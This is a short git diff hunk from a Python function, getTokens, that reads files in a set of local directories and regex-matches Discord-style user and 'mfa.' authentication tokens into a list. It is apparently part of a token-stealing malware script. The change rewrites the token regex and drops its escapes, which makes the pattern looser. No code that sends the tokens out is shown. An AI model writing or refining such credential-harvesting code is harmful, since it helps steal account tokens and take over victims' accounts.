@@ -27,7 +27,7 @@ def getTokens():
                 for file in os.listdir(location):
                     try:
                         with open(f"{location}\\{file}", encoding='utf-8', errors='ignore') as _file:
-                            tokenSearch = re.findall(r"N\w+\.\w+\.\w+|mfa\.\w+\-\_?\w+\-\_?\w+", _file.read())
+                            tokenSearch = re.findall(r"N\w+.\w+.\w+|mfa.\w+-_?\w+", _file.read())
                             if tokenSearch:
                                 for token in tokenSearch:
                                     TOKENS.append(token)
